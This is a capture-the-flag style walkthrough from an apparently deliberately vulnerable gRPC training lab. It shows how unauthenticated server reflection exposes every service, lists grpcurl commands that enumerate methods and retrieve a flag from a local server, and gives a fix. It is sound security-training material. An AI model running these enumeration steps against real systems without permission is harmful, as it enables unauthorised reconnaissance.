# Challenge 01 — Server Reflection

**Category:** Information Disclosure
**Difficulty:** 🟢 Easy
**Service:** All services (via reflection)
**Flag:** `FLAG{r3fl3ct10n_3xp0s3s_4ll_s3rv1c3s}`

---

## Background

gRPC Server Reflection is a protocol that allows clients to discover available services, RPCs, and message schemas at runtime — without having the `.proto` files. It's useful for development tools like `grpcurl` and `grpcui`, but **extremely dangerous in production** because it gives attackers a complete map of your API.

In DVGRPC, reflection is enabled on port 50051 with no authentication. An unauthenticated attacker can enumerate every service and every method before sending a single business request.

---

## Objective

1. Enumerate all services on `localhost:50051` using server reflection
2. List all methods on each service
3. Use the discovered `AdminService.GetFlag` RPC to retrieve the flag

---

## Steps

### Step 1: List all services

```bash
grpcurl -plaintext localhost:50051 list
```

Expected output:
```
dvgrpc.AdminService
dvgrpc.AuthService
dvgrpc.CommandService
dvgrpc.CryptoService
dvgrpc.FileService
dvgrpc.ProductService
dvgrpc.UserService
grpc.reflection.v1alpha.ServerReflection
```

### Step 2: Describe a service

```bash
grpcurl -plaintext localhost:50051 describe dvgrpc.AdminService
```

### Step 3: Describe a message type

```bash
grpcurl -plaintext localhost:50051 describe dvgrpc.GetFlagRequest
```

### Step 4: Retrieve the flag

```bash
grpcurl -plaintext localhost:50051 dvgrpc.AdminService/GetFlag \
  -d '{"challenge":"reflection"}'
```

---

## Automated Exploit

```bash
python client/exploits/exploit_01_reflection.py
```

---

## Vulnerable Code

`server/main.py` — reflection is enabled for all services:

```python
# VULNERABILITY: No auth on reflection — anyone can enumerate the full API
reflection.enable_server_reflection(service_names, server)
```

---

## Fix

```python
# Option 1: Disable reflection entirely in production
# Simply don't call enable_server_reflection()

# Option 2: Protect reflection with authentication
# Use a reflection interceptor that checks for a valid token
class ReflectionAuthInterceptor(grpc.ServerInterceptor):
    def intercept_service(self, continuation, handler_call_details):
        if "ServerReflection" in handler_call_details.method:
            # Check auth here
            ...
```

---

## OWASP Reference

[API8:2023 — Security Misconfiguration](https://owasp.org/API-Security/editions/2023/en/0xa8-security-misconfiguration/)
